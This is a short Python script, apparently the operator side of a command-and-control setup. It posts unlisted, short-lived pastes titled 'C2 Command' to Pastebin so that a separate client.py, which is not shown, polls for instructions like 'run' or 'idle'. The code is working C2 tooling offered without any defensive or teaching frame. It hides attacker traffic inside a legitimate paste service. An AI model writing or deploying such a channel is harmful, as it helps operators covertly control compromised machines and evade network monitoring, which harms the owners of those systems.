import requests

# Configuration
API_DEV_KEY = "YOUR_PASTEBIN_API_KEY"  # Replace with your actual API key
COMMAND_PASTE_ID = "[COMMAND_ID]"  # Replace with the ID of the paste you control
API_POST_URL = "https://pastebin.com/api/api_post.php"

def update_command(command):
    """
    Note: The standard Pastebin API does not allow updating an existing paste.
    To 'update' a command, you typically create a new paste and the client 
    would need to know the new ID, or you use a fixed ID and manually edit it 
    via the web interface. 
    
    For automation, this script demonstrates how to create a NEW paste with the command.
    """
    data = {
        'api_dev_key': API_DEV_KEY,
        'api_option': 'paste',
        'api_paste_code': command,
        'api_paste_private': '1',  # Unlisted
        'api_paste_name': 'C2 Command',
        'api_paste_expire_date': '10M'
    }
    try:
        response = requests.post(API_POST_URL, data=data)
        if response.status_code == 200:
            print(f"New command paste created: {response.text}")
            return response.text.split('/')[-1]
        else:
            print(f"Failed to create command: {response.text}")
    except Exception as e:
        print(f"Error: {e}")
    return None

if __name__ == "__main__":
    cmd = input("Enter command to send (e.g., 'run' or 'idle'): ")
    new_id = update_command(cmd)
    if new_id:
        print(f"Update your client.py COMMAND_URL with ID: {new_id}")
